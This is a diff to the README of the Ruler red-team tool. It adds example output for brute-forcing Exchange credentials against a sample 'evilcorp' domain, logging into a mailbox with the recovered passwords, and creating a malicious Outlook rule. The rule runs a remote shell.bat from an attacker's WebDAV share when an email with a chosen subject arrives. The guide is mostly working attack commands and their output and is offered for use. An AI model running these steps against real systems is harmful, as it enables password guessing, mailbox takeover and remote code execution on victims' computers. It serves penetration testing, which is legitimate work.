@@ -54,6 +54,33 @@ If you go the brute-force route, Ruler is your friend. It has a built-in brute-f
 ```
 ./ruler -domain targetdomain.com -brute -usernames /path/to/user.txt -passwords /path/to/passwords.txt
 ```
+You should see your brute-force in action:
+
+```
+./ruler -domain evilcorp.ninja -brute -usernames ~/users.txt -passwords ~/passwords.txt -delay 0 -v -insecure
+
+[*] Starting bruteforce
+[x] Failed: cindy.baker:P@ssw0rd
+[x] Failed: henry.hammond:P@ssw0rd
+[x] Failed: john.ford:P@ssw0rd
+[x] Failed: cindy.baker:August2016
+[x] Failed: henry.hammond:August2016
+[+] Success: john.ford:August2016
+[*] Multiple attempts. To prevent lockout - delaying for 0 minutes.
+[x] Failed: cindy.baker:Evilcorp@2016
+[x] Failed: henry.hammond:Evilcorp@2016
+[x] Failed: cindy.baker:3V1lc0rp
+[x] Failed: henry.hammond:3V1lc0rp
+[*] Multiple attempts. To prevent lockout - delaying for 0 minutes.
+[x] Failed: henry.hammond:Password1
+[+] Success: cindy.baker:Password1
+[x] Failed: henry.hammond:Password!2016
+[*] Multiple attempts. To prevent lockout - delaying for 0 minutes.
+[x] Failed: henry.hammond:SensePost1
+[x] Failed: henry.hammond:Lekker
+[*] Multiple attempts. To prevent lockout - delaying for 0 minutes.
+[x] Failed: henry.hammond:Eish
+```
 
 There are a few other flags that work with ```-brute```
 These are:
@@ -71,6 +98,23 @@ Once you have a set of credentials you can target the user's mailbox. Here you'l
 ./ruler -domain targetdomain.com -email user@targetdomain.com -user username -pass password -display
 ```
 
+Output:
+```
+./ruler -domain evilcorp.ninja -user john.ford -pass August2016 -email john.ford@evilcorp.ninja -display -insecure
+
+[*] Retrieving MAPI info
+[*] Doing Autodiscover for domain
+[+] MAPI URL found:  https://mail.evilcorp.ninja/mapi/emsmdb/?MailboxId=7bb476d4-8e1f-4a57-bbd8-beac7912fb77@evilcorp.ninja
+[+] User DN:  /o=Evilcorp/ou=Exchange Administrative Group (FYDIBOHF23SPDLT)/cn=Recipients/cn=beb65f5c92f74b868c138f7bcec7bfb8-John Ford
+[*] Got Context, Doing ROPLogin
+[*] And we are authenticated
+[+] Mailbox GUID:  [251 102 208 159 53 202 228 77 184 67 76 15 228 47 61 223]
+[*] Openning the Inbox
+[+] Retrieving Rules
+[+] Found 0 rules
+
+```
+
 ## Delete existing rules (clean up after  yourself)
 To delete rules, use the ruleId displayed next to the rule name (000000df1)
 
@@ -85,13 +129,30 @@ Now the fun part. Your initial setup is the same as outlined in the [Silentbreak
 To create the new rule user Ruler and:
 
 ```
-./ruler -domain targetdomain.com -email user@targetdomain.com -user username -pass password -loc \\\\yourserver\\webdav\\shell.bat -trigger "pop a shell" -rule maliciousrule
+./ruler -domain targetdomain.com -email user@targetdomain.com -user username -pass password -loc "\\yourserver\webdav\shell.bat" -trigger "pop a shell" -rule maliciousrule
 ```
 
 The various parts:
 * `-loc` _this is the location of your remote shell (or c:/Windows/system32/calc.exe)_
 * `-trigger` _the string within the subject you want to trigger the rule_
 * `-rule` _a name for your rule_
+
+
+Output:
+```
+[*] Retrieving MAPI info
+[*] Doing Autodiscover for domain
+[+] MAPI URL found:  https://mail.evilcorp.ninja/mapi/emsmdb/?MailboxId=7bb476d4-8e1f-4a57-bbd8-beac7912fb77@evilcorp.ninja
+[+] User DN:  /o=Evilcorp/ou=Exchange Administrative Group (FYDIBOHF23SPDLT)/cn=Recipients/cn=beb65f5c92f74b868c138f7bcec7bfb8-John Ford
+[*] Got Context, Doing ROPLogin
+[*] And we are authenticated
+[+] Mailbox GUID:  [251 102 208 159 53 202 228 77 184 67 76 15 228 47 61 223]
+[*] Openning the Inbox
+[*] Adding Rule
+[*] Rule Added. Fetching list of rules...
+[+] Found 1 rules
+Rule: shell RuleID: 01000000127380b1
+```
 
 You should now be able to send an email to your target with the trigger string in the subject line. From testing the mailrule is synchronised across nearly instantaniously, so in most cases you should be able to get a shell almost immediatly, assuming outlook is open and connected.
 
